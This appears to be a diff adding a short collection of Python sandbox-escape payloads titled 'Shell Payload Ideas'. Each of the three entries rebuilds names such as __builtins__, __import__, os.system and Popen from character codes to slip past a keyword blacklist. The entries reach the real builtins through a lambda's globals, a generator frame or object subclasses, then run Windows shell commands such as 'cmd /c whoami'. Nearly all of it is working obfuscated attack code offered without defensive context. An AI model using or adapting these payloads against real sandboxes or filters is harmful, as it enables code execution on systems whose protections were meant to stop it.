@@ -1,0 +1,45 @@
+Shell Payload Ideas
+
+Lambda Globals + os.system
+Uses a throwaway lambda to retrieve real builtins, rebuilds the sensitive names via chr, then calls cmd /c whoami. No blacklisted literals appear.
+
+t=(lambda:0)
+gkey=''.join(map(chr,[95,95,103,108,111,98,97,108,115,95,95]))
+bkey=''.join(map(chr,[95,95,98,117,105,108,116,105,110,115,95,95]))
+ikey=''.join(map(chr,[95,95,105,109,112,111,114,116,95,95]))
+skey=''.join(map(chr,[115,121,115,116,101,109]))
+mkey=''.join(map(chr,[111,115]))
+gl=type(t).__getattribute__(t,gkey)
+built=gl[bkey]
+mod=built[ikey](mkey)
+type(mod).__getattribute__(mod,skey)('cmd /c whoami')
+Generator Frame Route
+Pulls builtins out of a generator’s frame, again assembling keys character-by-character, and executes cmd /c echo pwning.
+
+frame=(c for c in ()).gi_frame
+fkey=''.join(map(chr,[102,95,103,108,111,98,97,108,115]))
+bkey=''.join(map(chr,[95,95,98,117,105,108,116,105,110,115,95,95]))
+ikey=''.join(map(chr,[95,95,105,109,112,111,114,116,95,95]))
+skey=''.join(map(chr,[115,121,115,116,101,109]))
+modkey=''.join(map(chr,[111,115]))
+gl=type(frame).__getattribute__(frame,fkey)
+built=gl[bkey]
+mod=built[ikey](modkey)
+type(mod).__getattribute__(mod,skey)('cmd /c echo pwning')
+subprocess Chain via Dynamic Class Lookup
+After importing the module through rebuilt names, filters object.__subclasses__() for the Popen class using an obfuscated label, then runs whoami.
+
+subs=(()).__class__.__bases__[0].__subclasses__()
+func=[c for c in subs if type(c.__init__).__name__=='function'][0]
+get=type(func.__init__).__getattribute__
+gkey=''.join(map(chr,[95,95,103,108,111,98,97,108,115,95,95]))
+bkey=''.join(map(chr,[95,95,98,117,105,108,116,105,110,115,95,95]))
+ikey=''.join(map(chr,[95,95,105,109,112,111,114,116,95,95]))
+pk=''.join(map(chr,[115,117,98,112,114,111,99,101,115,115]))
+cname=''.join(map(chr,[80,111,112,101,110]))
+skey=''.join(map(chr,[115,121,115,116,101,109]))
+gl=get(func.__init__,gkey)
+built=gl[bkey]
+built[ikey](pk)
+cls=[c for c in ().__class__.__mro__[1].__subclasses__() if type.__getattribute__(c,'__name__')==cname][0]
+print(cls(['cmd','/c','whoami'],stdout=-1).communicate()[0])
